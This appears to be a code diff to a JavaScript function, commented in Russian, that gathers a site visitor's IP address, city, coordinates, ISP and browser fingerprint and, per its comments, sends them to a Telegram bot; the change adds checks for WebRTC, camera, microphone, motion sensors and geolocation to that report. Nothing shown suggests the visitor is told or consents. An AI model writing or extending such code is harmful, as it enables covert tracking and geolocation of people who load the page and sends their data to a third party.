@@ -48,13 +48,29 @@ function getClientInfo() {
       // Тип устройства (мобильное или десктопное)
       const deviceType = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(ua) ? 'Mobile' : 'Desktop';
 
+      // Проверка поддержки WebRTC
+      const isWebRTCSupported = typeof navigator.mediaDevices.getUserMedia === 'function' ? 'Yes' : 'No';
+
+      // Проверка доступности камеры и микрофона
+      const hasCamera = 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices ? 'Yes' : 'No';
+      const hasMicrophone = 'mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices ? 'Yes' : 'No';
+
+      // Проверка доступности сенсоров (акселерометр, гироскоп)
+      const hasGyroscope = 'DeviceOrientationEvent' in window ? 'Yes' : 'No';
+      const hasAccelerometer = 'DeviceMotionEvent' in window ? 'Yes' : 'No';
+
+      // Поддержка Geolocation API
+      const hasGeolocation = 'geolocation' in navigator ? 'Yes' : 'No';
+
       // Формируем сообщение, которое отправим в Telegram
       const message = encodeURIComponent(
         `IP: ${ip}\nCountry: ${country} ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\n\n` +
         `User-Agent: ${ua}\nLanguage: ${language}\nPlatform: ${platform}\nScreen: ${screenWidth}x${screenHeight}\n` +
         `Color Depth: ${colorDepth}-bit\nTimezone: ${timezone}\nTouch Device: ${isTouchDevice}\n` +
         `Vendor: ${vendor}\nApp Version: ${appVersion}\nWebGL Support: ${isWebGLSupported}\nCookies Enabled: ${cookiesEnabled}\n` +
-        `Device Memory: ${deviceMemory} GB\nLoad Time: ${loadTime}\nDevice Type: ${deviceType}`
+        `Device Memory: ${deviceMemory} GB\nLoad Time: ${loadTime}\nDevice Type: ${deviceType}\n` +
+        `WebRTC Support: ${isWebRTCSupported}\nCamera Available: ${hasCamera}\nMicrophone Available: ${hasMicrophone}\n` +
+        `Gyroscope Support: ${hasGyroscope}\nAccelerometer Support: ${hasAccelerometer}\nGeolocation API Support: ${hasGeolocation}`
       );
 
       // Настроим Telegram Bot API URL для отправки сообщения
